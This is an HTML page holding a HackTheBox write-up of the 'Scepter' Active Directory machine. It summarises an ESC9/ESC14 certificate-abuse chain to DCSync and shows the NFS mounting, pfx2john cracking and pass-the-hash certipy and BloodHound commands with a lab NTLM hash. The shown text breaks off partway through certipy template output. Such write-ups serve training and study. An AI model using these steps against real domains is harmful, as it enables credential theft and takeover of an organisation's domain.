<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <title>Scepter - Hexicon Archives</title>
    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
    <link rel="stylesheet" href="../style.css">
    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Scepter.html" />
    <!-- Machine-specific metadata for SEO -->
    <meta name="description" content="Detailed writeup for Scepter machine from HackTheBox - Hard difficulty level">
    <meta name="keywords" content="HackTheBox, Scepter, Hard, CTF, writeup, cybersecurity, penetration testing, Hexicon">
</head>
<body>
    <header>
        <div class="container header-content">
            <a href="../machines.html" class="logo">Machine writeups</a>
            <div class="header-controls">
                <a href="../index.html" class="htb-icon" title="Link to the main page">
                    <img src="../favicon.png" alt="Archive" width="30" height="30">
                </a>
                <div class="hamburger-menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </header>
    
    <div class="sidebar">
        <div class="difficulty-buttons">
            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
            <div class="machine-list" id="easy-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <div class="machine-list" id="medium-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
            <div class="machine-list" id="hard-machines">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
            <div class="machine-list" id="insane-machines">
                <!-- Will be populated dynamically -->
            </div>
        </div>
    </div>
    
    <div class="backdrop"></div>
    
    <main class="container writeup-content">
        <h1 class="writeup-title">Scepter</h1>
        <div class="writeup-metadata">
            <span class="difficulty hard">Hard</span>
            <span class="date">July 19, 2025</span>
        </div>
        
        <div class="writeup-container">
            <div class="writeup-body">
                <!-- Machine-specific content goes here -->
                <p><img alt="pwned" src="../images/Scepter/pwned.png" /></p>
<p>Scepter was an interesting Windows Active Directory box that started with extensive AD-related services exposed, including an unusual NFS share on port 2049.
Initial reconnaissance revealed a /helpdesk share containing PKI certificates, which I extracted and cracked using pfx2john to obtain the export password <code>newpassword</code>.
Using the extracted certificates with certipy, I obtained NTLM hashes for multiple users including d.baker.</p>
<p>Bloodhound enumeration revealed that d.baker could force a password change on a.carter, who belonged to the IT Support group with GenericAll rights over the Staff Access Certificate OU containing d.baker.
Additionally, h.brown had remote access capabilities and was identified as a high-value target.</p>
<p>Certificate template analysis with certipy revealed an ESC9 vulnerability in the StaffAccessCertificate template, which allowed staff members to enroll without security extensions.
However, d.baker lacked the required email attribute for certificate enrollment.
I exploited the privilege chain by resetting a.carter's password, granting them FullControl over the Staff Access Certificate OU, then using ldapmodify to set d.baker's email to h.brown@scepter.htb.
This enabled me to request a certificate as d.baker but authenticate as h.brown due to the email mismatch, leveraging ESC9 to impersonate h.brown and gain remote access to the domain controller.</p>
<p>Further enumeration with bloodyAD revealed that h.brown had write access to the altSecurityIdentities attribute of p.adams, enabling an ESC14 to ESC9 attack chain.
Privilege escalation was achieved by modifying p.adams' altSecurityIdentities attribute to include their email, then repeating the certificate request process with d.baker's email changed to match p.adams.
This granted me p.adams' credentials, who possessed DCSync privileges over the domain.
Using secretsdump with p.adams' hash, I extracted the administrator's NTLM hash and achieved administrator access, completing the complex AD certificate services exploitation chain.</p>
<h1>User flag</h1>
<div class="codehilite"><pre><span></span><code><span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.129.170.80</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.12</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">987</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">conn</span><span class="o">-</span><span class="nx">refused</span><span class="p">)</span>
<span class="nx">PORT</span><span class="w">     </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w">       </span><span class="nx">VERSION</span>
<span class="mi">53</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">domain</span><span class="w">        </span><span class="nx">Simple</span><span class="w"> </span><span class="nx">DNS</span><span class="w"> </span><span class="nx">Plus</span>
<span class="mi">88</span><span class="o">/</span><span class="nx">tcp</span><span class="w">   </span><span class="nx">open</span><span class="w">  </span><span class="nx">kerberos</span><span class="o">-</span><span class="nx">sec</span><span class="w">  </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Kerberos</span><span class="w"> </span><span class="p">(</span><span class="nx">server</span><span class="w"> </span><span class="nx">time</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">23</span><span class="w"> </span><span class="mi">02</span><span class="p">:</span><span class="mi">17</span><span class="p">:</span><span class="mi">53</span><span class="nx">Z</span><span class="p">)</span>
<span class="mi">111</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">rpcbind</span><span class="p">?</span>
<span class="o">|</span><span class="nx">_rpcinfo</span><span class="p">:</span><span class="w"> </span><span class="nx">ERROR</span><span class="p">:</span><span class="w"> </span><span class="nx">Script</span><span class="w"> </span><span class="nx">execution</span><span class="w"> </span><span class="nx">failed</span><span class="w"> </span><span class="p">(</span><span class="nx">use</span><span class="w"> </span><span class="o">-</span><span class="nx">d</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">debug</span><span class="p">)</span>
<span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">msrpc</span><span class="w">         </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span>
<span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span><span class="w">   </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
<span class="mi">389</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">23</span><span class="nx">T02</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">53</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h00m01s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span><span class="p">?</span>
<span class="mi">464</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">kpasswd5</span><span class="p">?</span>
<span class="mi">593</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ncacn_http</span><span class="w">    </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">RPC</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">HTTP</span><span class="w"> </span><span class="m m-Double">1.0</span>
<span class="mi">636</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">23</span><span class="nx">T02</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">51</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h00m01s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="mi">2049</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">mountd</span><span class="w">        </span><span class="mi">1</span><span class="o">-</span><span class="mi">3</span><span class="w"> </span><span class="p">(</span><span class="nx">RPC</span><span class="w"> </span><span class="err">#</span><span class="mi">100005</span><span class="p">)</span>
<span class="mi">3268</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ldap</span><span class="w">          </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">23</span><span class="nx">T02</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">53</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h00m01s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="mi">3269</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssl</span><span class="o">/</span><span class="nx">ldap</span><span class="w">      </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Windows</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="p">(</span><span class="nx">Domain</span><span class="p">:</span><span class="w"> </span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb0</span><span class="p">.,</span><span class="w"> </span><span class="nx">Site</span><span class="p">:</span><span class="w"> </span><span class="nx">Default</span><span class="o">-</span><span class="nx">First</span><span class="o">-</span><span class="nx">Site</span><span class="o">-</span><span class="nx">Name</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_ssl</span><span class="o">-</span><span class="nx">date</span><span class="p">:</span><span class="w"> </span><span class="mi">2025</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">23</span><span class="nx">T02</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="mi">53</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="nx">h00m01s</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">scanner</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssl</span><span class="o">-</span><span class="nx">cert</span><span class="p">:</span><span class="w"> </span><span class="nx">Subject</span><span class="p">:</span><span class="w"> </span><span class="nx">commonName</span><span class="p">=</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Subject</span><span class="w"> </span><span class="nx">Alternative</span><span class="w"> </span><span class="nx">Name</span><span class="p">:</span><span class="w"> </span><span class="nx">othername</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">1.3.6.1.4.1.311.25.1</span><span class="p">:&lt;</span><span class="nx">unsupported</span><span class="p">&gt;,</span><span class="w"> </span><span class="nx">DNS</span><span class="p">:</span><span class="nx">dc01</span><span class="p">.</span><span class="nx">scepter</span><span class="p">.</span><span class="nx">htb</span>
<span class="o">|</span><span class="w"> </span><span class="nx">Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">before</span><span class="p">:</span><span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="o">|</span><span class="nx">_Not</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">after</span><span class="p">:</span><span class="w">  </span><span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">01</span><span class="nx">T03</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">33</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">DC01</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Windows</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">microsoft</span><span class="p">:</span><span class="nx">windows</span>
</code></pre></div>

<p>Initial nmap scan reveals many ports, most of which are related to Active Directory.</p>
<h2>Getting d.baker's NTLM hash</h2>
<p>One thing that catches my eye is the open mountd port on 2049. This could be a potentially accessible network share, so I'll check it out.</p>
<p><code>showmount -e 10.129.170.80</code></p>
<p><img alt="showmount" src="../images/Scepter/showmount.png" /></p>
<p>There is a helpdesk share accessible to everyone. I will mount it to my machine to see what it contains.</p>
<div class="codehilite"><pre><span></span><code>mkdir /tmp/helpdesk

sudo mount -t nfs 10.129.170.80:/helpdesk /tmp/helpdesk
</code></pre></div>

<p><img alt="certs" src="../images/Scepter/certs.png" /></p>
<p>There are a few certs inside. I can read the baker.crt file without issues, but the .pfx files require an import password.</p>
<p><img alt="certissue" src="../images/Scepter/certissue.png" /></p>
<p>I will use pfx2john to generate a hash in an attempt to crack the password with john.</p>
<p><img alt="john" src="../images/Scepter/john.png" /></p>
<p><code>CertsExportPassword | newpassword</code></p>
<p>All the .pfx files have the same password set. This will come in handy once I find some use for the certs.</p>
<p>I can combine the baker.crt and baker.key files to create a baker.pfx. Once I do that, I'll use the .pfx files with certipy to get NTLM hashes of the users.</p>
<p><img alt="pfx" src="../images/Scepter/pfx.png" /></p>
<p>The same password as earlier was used for the .crt file. I set a blank export password for the newly created .pfx file simply by pressing the enter key without typing anything.</p>
<p><img alt="ntlm" src="../images/Scepter/ntlm.png" /></p>
<h2>Bloodhound enumeration</h2>
<p><code>bloodhound-python -c all --zip -d scepter.htb -ns 10.129.170.80 -dc dc01.scepter.htb -u d.baker --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'</code></p>
<p><img alt="baker1" src="../images/Scepter/baker1.png" /></p>
<p>D.baker is a member of the staff group.</p>
<p><img alt="baker2" src="../images/Scepter/baker2.png" /></p>
<p>D.baker can also force a password change of a.carter.</p>
<p><img alt="carter" src="../images/Scepter/carter.png" /></p>
<p>A.carter is a member of the IT Support group, and the members of that group have GenericAll over the Staff Access Certificate OU.</p>
<p><img alt="OU" src="../images/Scepter/OU.png" /></p>
<p>And the mentioned OU contains the d.baker user. This means that Descendant Object Takeover can be performed with a.carter to gain full rights over d.baker.</p>
<p><img alt="brown" src="../images/Scepter/brown.png" /></p>
<p>H.brown is a member of the protected group, and they can remote into the machine as well.</p>
<h2>Certipy enumeration</h2>
<p><code>certipy-ad find -enabled -vulnerable -dc-ip 10.129.170.80 -target-ip 10.129.170.80 -u d.baker@scepter.htb -hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'</code></p>
<div class="codehilite"><pre><span></span><code><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Authorities</span>
<span class="w">  </span><span class="mi">0</span>
<span class="w">    </span><span class="nv">CA</span><span class="w"> </span><span class="nv">Name</span><span class="w">                             </span>:<span class="w"> </span><span class="nv">scepter</span><span class="o">-</span><span class="nv">DC01</span><span class="o">-</span><span class="nv">CA</span>
<span class="w">    </span><span class="nv">DNS</span><span class="w"> </span><span class="nv">Name</span><span class="w">                            </span>:<span class="w"> </span><span class="nv">dc01</span>.<span class="nv">scepter</span>.<span class="nv">htb</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Subject</span><span class="w">                 </span>:<span class="w"> </span><span class="nv">CN</span><span class="o">=</span><span class="nv">scepter</span><span class="o">-</span><span class="nv">DC01</span><span class="o">-</span><span class="nv">CA</span>,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span><span class="nv">scepter</span>,<span class="w"> </span><span class="nv">DC</span><span class="o">=</span><span class="nv">htb</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Serial</span><span class="w"> </span><span class="nv">Number</span><span class="w">           </span>:<span class="w"> </span><span class="mi">716</span><span class="nv">BFFE1BE1CD1A24010F3AD0E350340</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Validity</span><span class="w"> </span><span class="nv">Start</span><span class="w">          </span>:<span class="w"> </span><span class="mi">2024</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">31</span><span class="w"> </span><span class="mi">22</span>:<span class="mi">24</span>:<span class="mi">19</span><span class="o">+</span><span class="mi">00</span>:<span class="mi">00</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Validity</span><span class="w"> </span><span class="k">End</span><span class="w">            </span>:<span class="w"> </span><span class="mi">2061</span><span class="o">-</span><span class="mi">10</span><span class="o">-</span><span class="mi">31</span><span class="w"> </span><span class="mi">22</span>:<span class="mi">34</span>:<span class="mi">19</span><span class="o">+</span><span class="mi">00</span>:<span class="mi">00</span>
<span class="w">    </span><span class="nv">Web</span><span class="w"> </span><span class="nv">Enrollment</span><span class="w">                      </span>:<span class="w"> </span><span class="nv">Disabled</span>
<span class="w">    </span><span class="nv">User</span><span class="w"> </span><span class="nv">Specified</span><span class="w"> </span><span class="nv">SAN</span><span class="w">                  </span>:<span class="w"> </span><span class="nv">Disabled</span>
<span class="w">    </span><span class="nv">Request</span><span class="w"> </span><span class="nv">Disposition</span><span class="w">                 </span>:<span class="w"> </span><span class="nv">Issue</span>
<span class="w">    </span><span class="nv">Enforce</span><span class="w"> </span><span class="nv">Encryption</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">Requests</span><span class="w">     </span>:<span class="w"> </span><span class="nv">Enabled</span>
<span class="w">    </span><span class="nv">Permissions</span>
<span class="w">      </span><span class="nv">Owner</span><span class="w">                             </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Administrators</span>
<span class="w">      </span><span class="nv">Access</span><span class="w"> </span><span class="nv">Rights</span>
<span class="w">        </span><span class="nv">ManageCertificates</span><span class="w">              </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Administrators</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">ManageCa</span><span class="w">                        </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Administrators</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Domain</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">                                          </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Enterprise</span><span class="w"> </span><span class="nv">Admins</span>
<span class="w">        </span><span class="nv">Enroll</span><span class="w">                          </span>:<span class="w"> </span><span class="nv">SCEPTER</span>.<span class="nv">HTB</span>\<span class="nv">Authenticated</span><span class="w"> </span><span class="nv">Users</span>
<span class="nv">Certificate</span><span class="w"> </span><span class="nv">Templates</span>
<span class="w">  </span><span class="mi">0</span>
<span class="w">    </span><span class="nv">Template</span><span class="w"> </span><span class="nv">Name</span><span class="w">                       </span>:<span class="w"> </span><span class="nv">StaffAccessCertificate</span>
<span class="w">    </span><span class="nv">Display</span><span class="w"> </span><span class="nv">Name</span><span class="w">                        </span>:<span class="w"> </span><span class="nv">StaffAccessCertificate</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Authorities</span><span class="w">             </span>:<span class="w"> </span><span class="nv">scepter</span><span class="o">-</span><span class="nv">DC01</span><span class="o">-</span><span class="nv">CA</span>
<span class="w">    </span><span class="nv">Enabled</span><span class="w">                             </span>:<span class="w"> </span><span class="nv">True</span>
<span class="w">    </span><span class="nv">Client</span><span class="w"> </span><span class="nv">Authentication</span><span class="w">               </span>:<span class="w"> </span><span class="nv">True</span>
<span class="w">    </span><span class="nv">Enrollment</span><span class="w"> </span><span class="nv">Agent</span><span class="w">                    </span>:<span class="w"> </span><span class="nv">False</span>
<span class="w">    </span><span class="nv">Any</span><span class="w"> </span><span class="nv">Purpose</span><span class="w">                         </span>:<span class="w"> </span><span class="nv">False</span>
<span class="w">    </span><span class="nv">Enrollee</span><span class="w"> </span><span class="nv">Supplies</span><span class="w"> </span><span class="nv">Subject</span><span class="w">           </span>:<span class="w"> </span><span class="nv">False</span>
<span class="w">    </span><span class="nv">Certificate</span><span class="w"> </span><span class="nv">Name</span><span class="w"> </span><span class="nv">Flag</span><span class="w">               </span>:<span class="w"> </span><span class="nv">SubjectRequireEmail</span>
<span class="w">                                          </span><span class="nv">SubjectRequireDnsAsCn</span>
<span class="w">                                          </span><span class="nv">SubjectAltRequireEmail</span>
<span class="w">    </span><span class="nv">Enrollment</span><span class="w"> </span><span class="nv">Flag</span><span class="w">                     </span>:<span class="w"> </span><span class="nv">NoSecurityExtension</span>
<span class="w">                                          </span><span class="nv">AutoEnrollment</span>
<span class="w">    </span><span class="nv">Private</span><span class="w"> </span><span class="nv">Key</span><span class="w"> </span><span class="nv">Flag</span><span class="w">                    </span>:<span class="w"> </span><span class="mi">16842752</span>
